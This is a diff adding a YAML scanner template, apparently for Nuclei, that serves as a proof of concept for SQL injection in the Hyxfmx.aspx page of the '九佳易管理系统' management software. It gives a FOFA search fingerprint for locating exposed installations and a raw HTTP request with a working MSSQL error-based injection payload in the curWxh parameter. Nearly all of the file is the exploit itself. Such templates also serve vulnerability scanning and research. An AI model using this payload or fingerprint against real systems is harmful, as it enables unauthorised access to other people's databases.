@@ -1,0 +1,23 @@
+id: poc-de0iu9ugluq6n2i0
+info:
+  name: 九佳易管理系统 Hyxfmx存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/de0iu9ugluq6n2i0'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: de0iu9ugluq6n2i0
+    fofa: body="/Scripts/Login_A8/"
+http:
+- raw:
+  - 'GET /HuiYuan/Hyxfmx.aspx?curWxh=1'')+and+1111+in+(select+sys.fn_sqlvarbasetostr(HashBytes(''MD5'',''123'')))--+ HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+
+    like Gecko) Chrome/91.0.4472.77 Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
